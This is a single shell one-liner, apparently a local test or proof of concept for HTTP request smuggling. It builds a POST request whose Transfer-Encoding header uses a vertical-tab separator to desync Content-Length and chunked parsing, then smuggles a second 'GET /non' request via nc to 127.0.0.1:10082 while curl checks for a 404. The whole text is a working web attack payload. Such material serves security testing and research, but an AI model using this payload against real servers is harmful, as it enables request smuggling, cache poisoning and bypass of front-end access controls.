printf 'POST / HTTP/1.1\r\n'\
'Host: 127.0.0.1\r\n'\
'Connection: keep-alive\r\n'\
'Content-Length: 28\r\n'\
'Transfer-Encoding:\x0bchunked\r\n'\
'\r\n'\
'0\r\n'\
'\r\n'\
'GET /non HTTP/1.1\r\n'\
'a: a' | nc 127.0.0.1 10082 & curl 127.0.0.1:10082 | grep 404 -I --color
